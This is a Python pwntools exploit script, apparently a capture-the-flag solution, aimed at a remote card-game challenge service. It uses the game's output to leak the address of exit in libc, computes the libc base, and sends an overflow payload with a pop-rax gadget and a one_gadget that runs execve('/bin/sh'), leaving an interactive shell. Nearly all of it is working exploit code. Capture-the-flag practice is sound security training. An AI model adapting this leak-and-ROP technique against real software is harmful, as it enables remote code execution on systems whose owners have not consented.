#!/usr/bin/env python3
from pwn import *

r = remote("challenges.ctfd.io", 30466)
libc = ELF("libc-2.23.so")
# execve("/bin/sh", NULL, NULL)
# constraint : rax = 0
one_gadget = 0x45226
#0x000000000003a738 : pop rax ; ret
pop_rax = 0x3a738

def drop_cards():
    for i in range(52):
        data = r.recvuntil(">> ", "1")
        if b"Happy Joker" in data:
            leak = int(data.split(b"\t")[-1].split(b"\n")[0].decode())
            return leak
        r.sendline("1")

r.recv(700)
r.sendline("A"*62)
r.sendlineafter(">> ", "1")
exit_got = drop_cards()
log.success("Exit got : " + hex(exit_got))
libc_base = exit_got - libc.symbols["exit"]
log.success("libc base : " + hex(libc_base))
log.success("one gadget : " + hex(libc_base + one_gadget))

r.sendline("2")

r.sendlineafter(">> ", "2")
r.sendlineafter(">> ", "2")

r.sendlineafter(">> ", b"B"*(64-20-8) + p64(libc_base + pop_rax) + p64(0) + p64(libc_base + one_gadget))
r.interactive()
